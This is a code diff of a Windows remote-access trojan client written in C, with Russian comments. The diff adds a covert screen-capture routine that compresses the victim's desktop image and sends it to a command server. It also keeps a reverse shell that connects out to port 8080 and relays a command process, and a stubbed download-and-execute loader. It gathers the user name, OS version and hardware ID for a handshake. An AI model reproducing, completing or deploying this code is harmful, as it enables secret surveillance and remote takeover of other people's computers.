@@ -16,19 +16,20 @@
 
 SOCKET Socket;
 
-#define CMD_HADSHAKE	0
-#define CMD_ONLINE		1
-#define CMD_OTVET_OK	2
-#define CMD_OTVET_ER	3
-#define CMD_SCREEN		4
-#define CMD_LOADER		5
-#define CMD_SHELL		6
+#define CMD_HADSHAKE	0x0
+#define CMD_ONLINE		0x1
+#define CMD_OTVET_OK	0x2
+#define CMD_OTVET_ER	0x3
+#define CMD_SCREEN		0x4
+#define CMD_LOADER		0x5
+#define CMD_SHELL		0x6
+
+void SaveBitmap(char* szFilename, HBITMAP hBitmap);
 
 int x1, y1, x2, y2, w, h;
 
 typedef struct CLIENTS
 {
-	SOCKET SOCKET;
 	char USERNAME[100];
 	char OSVER[100];
 	char HWID[100];
@@ -36,20 +37,21 @@ typedef struct CLIENTS
 
 typedef struct DLE
 {
-	char URL[1000];
+	char URL[1020];
 } DLE;
 
 typedef struct BIGSCREEN
 {
 	int w;
 	int h;
-	ULONG ZipSize;
+	DWORD ZipSize;
+	DWORD Size;
 } BIGSCREEN;
 
 typedef struct CMDiDATA
 {
 	DWORD CMD;
-	char DATA[1000];
+	BYTE DATA[1020];
 } CMDiDATA;
 
 char* GetHwid()
@@ -100,18 +102,121 @@ char* GetOS()
 	return os;
 }
 
+BYTE *Decompress(BYTE *compBuffer, \
+	const int compBufferLen, \
+	const int uncompBufferLen, \
+	DWORD *uncompBufferSize)
+{
+	BYTE *uncompBuffer = (BYTE*)malloc(uncompBufferLen);
+	memset(uncompBuffer, 0, uncompBufferLen);
+
+	NTSTATUS result = pRtlDecompressBuffer(
+		COMPRESSION_FORMAT_LZNT1,
+		uncompBuffer,
+		uncompBufferLen,
+		compBuffer,
+		compBufferLen,
+		uncompBufferSize
+	);
+	if (result != STATUS_SUCCESS)
+	{
+		return 0;
+	}
+	return uncompBuffer;
+}
+
+BYTE *Compress(BYTE *uncompBuffer, \
+	const DWORD uncompBufferLen, \
+	DWORD compBufferLen, \
+	DWORD *compBufferSize)
+{
+	DWORD bufWorkspaceSize;
+	DWORD fragWorkspaceSize;
+	NTSTATUS ret = pRtlGetCompressionWorkSpaceSize(
+		COMPRESSION_FORMAT_LZNT1,
+		&bufWorkspaceSize,
+		&fragWorkspaceSize
+	);
+
+	if (ret != STATUS_SUCCESS) {
+		return 0;
+	}
+	VOID *workspace = (VOID *)LocalAlloc(LMEM_FIXED, bufWorkspaceSize);
+	
+	if (workspace == NULL) {
+		return 0;
+	}
+
+	BYTE *compBuffer = (BYTE*)malloc(compBufferLen);
+	memset(compBuffer, 0, sizeof(compBufferLen));
+
+	NTSTATUS result = pRtlCompressBuffer(
+		COMPRESSION_FORMAT_LZNT1,
+		uncompBuffer,
+		uncompBufferLen,
+		compBuffer,
+		compBufferLen,
+		2048,
+		compBufferSize,
+		workspace
+	);
+	LocalFree(workspace);
+	if (result != STATUS_SUCCESS) {
+		return 0;
+	}
+	return compBuffer;
+}
+
 DWORD WINAPI GETSCREEN(LPVOID param)
 {
+	HDC hScreen = GetDC(NULL);
+	HDC hDC = CreateCompatibleDC(hScreen);
+	BYTE* buff;
+	HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, 683, 384);
+	SelectObject(hDC, hBitmap);
+	SetStretchBltMode(hDC, HALFTONE);
+	StretchBlt(hDC, 0, 0, 683, 384, hScreen, 0, 0, w, h, SRCCOPY);
+	SelectObject(hDC, hBitmap);
+	BITMAPINFO bmi = { sizeof(BITMAPINFOHEADER), 683, 384, 1, 32, BI_RGB, 0, 0, 0, 0, 0 };
+	GetDIBits(hDC, hBitmap, 0, 384, NULL, &bmi, DIB_RGB_COLORS);
+	DWORD buffsize;
+	buffsize = bmi.bmiHeader.biSizeImage;
+	buff = (BYTE*)malloc(buffsize);
+	GetDIBits(hDC, hBitmap, 0, 384, buff, &bmi, DIB_RGB_COLORS);
+	DWORD realCompSize;
+	BYTE *compressed_buffer = Compress(buff, buffsize, buffsize + 512, &realCompSize);
+	CMDiDATA indata;
+	memset(&indata, 0, sizeof(CMDiDATA));
+	
+	indata.CMD = CMD_SCREEN;
+	BIGSCREEN screenshot;
+	screenshot.w = 683;
+	screenshot.h = 384;
+	screenshot.ZipSize = realCompSize;
+	screenshot.Size = buffsize;
+	memcpy(&indata.DATA, &screenshot, sizeof(BIGSCREEN));
+	send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
+	send(Socket, (char *)compressed_buffer, screenshot.ZipSize, 0);
+	
+	free(buff);
+	DeleteDC(hDC);
+	DeleteDC(hScreen);
+	DeleteObject(hBitmap);
+	free(compressed_buffer);
+	memset(&bmi, 0, sizeof(BITMAPINFO));
+	memset(&indata, 0, sizeof(CMDiDATA));
+	memset(&screenshot, 0, sizeof(BIGSCREEN));
 	return 0;
 }
 
 DWORD WINAPI DLEFUNC(LPVOID url)
 {
-	char *urlarrdfile = (char*)url;
-	CMDiDATA indata; //создаем структуру отвечающую за протокол
-	memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
-	indata.CMD = CMD_OTVET_OK;
-	send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
+	//char *urlarrdfile = (char*)url;
+	//CMDiDATA indata; //создаем структуру отвечающую за протокол
+	//memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
+	//indata.CMD = CMD_OTVET_OK;
+	//send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
+	printf("\n download and execute");
 	return 0;
 }
 
@@ -123,13 +228,11 @@ DWORD WINAPI RUNSHELL(LPVOID port)
 	sin.sin_port = htons(8080);
 	sin.sin_addr.S_un.S_addr = inet_addr(ADDRSERVER);
 	shellsock = socket(AF_INET, SOCK_STREAM, 0);
-
 	DWORD lpNumberOfBytesRead;
 	SECURITY_ATTRIBUTES secu =
 	{
 		(DWORD)sizeof(SECURITY_ATTRIBUTES), NULL, TRUE
 	};
-
 	STARTUPINFOA sInfo;
 	PROCESS_INFORMATION pInfo;
 	HANDLE hPipeRead1, hPipeWrite1, hPipeRead2, hPipeWrite2;
@@ -213,21 +316,27 @@ DWORD WINAPI RecvThread(LPVOID param)
 			{
 				case CMD_LOADER://если indata.cmd == CMD_LOADER
 				{
-					DLE dle; //инициализируем структуру DLE
-					memset(&dle, 0, sizeof(DLE)); //очищаем ее
-					memcpy(&dle, indata.DATA, sizeof(indata.DATA)); //и копируем в нее indata.DATA
-					CreateThread(NULL, 0, DLEFUNC, (LPVOID)dle.URL, 0, 0);
+					printf("\nsignal cmd_loader\n");
+					//DLE dle; //инициализируем структуру DLE
+					//memset(&dle, 0, sizeof(DLE)); //очищаем ее
+					//memcpy(&dle, indata.DATA, sizeof(indata.DATA)); //и копируем в нее indata.DATA
+					//CreateThread(NULL, 0, DLEFUNC, (LPVOID)dle.URL, 0, 0);
+					CreateThread(NULL, 0, DLEFUNC, NULL, 0, 0);
 					break;
 				}
 
 				case CMD_SHELL:
 				{
-					CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RUNSHELL, NULL, 0, 0);
+					printf("\nsignal cmd_shell\n");
+					CreateThread(NULL, 0, RUNSHELL, NULL, 0, 0);
+					break;
 				}
 
 				case CMD_SCREEN:
 				{
-					CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GETSCREEN, NULL, 0, 0);
+					printf("\nsignal cmd_screen\n");
+					CreateThread(NULL, 0, GETSCREEN, NULL, 0, 0);
+					break;
 				}
 				default:
 					break;
@@ -252,11 +361,20 @@ int WINAPI WinMain(
 	int       nShowCmd
 )
 {
+	x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
+	y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
+	x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+	y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+	w = x2 - x1;
+	h = y2 - y1;
+
 	HMODULE ntdll = LoadLibraryA("ntdll.dll");
 	pRtlGetCompressionWorkSpaceSize = (fRtlGetCompressionWorkSpaceSize)\
 		GetProcAddress(ntdll, "RtlGetCompressionWorkSpaceSize");
 	pRtlCompressBuffer = (fRtlCompressBuffer)\
 		GetProcAddress(ntdll, "RtlCompressBuffer");
+	pRtlDecompressBuffer = (fRtlDecompressBuffer)\
+		GetProcAddress(ntdll, "RtlDecompressBuffer");
 
 	struct WSAData wsaData;
 	SOCKADDR_IN ServerAddr;
@@ -274,6 +392,7 @@ start:
 
 	if (connect(Socket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) == 0)
 	{
+		printf("connected!\n");
 		//если мы подключились то передаем хендшейк:)
 		CMDiDATA indata; //создаем структуру отвечающую за протокол
 		CLIENTS client; //создаем структуру отвечающую за инфу о клиенте
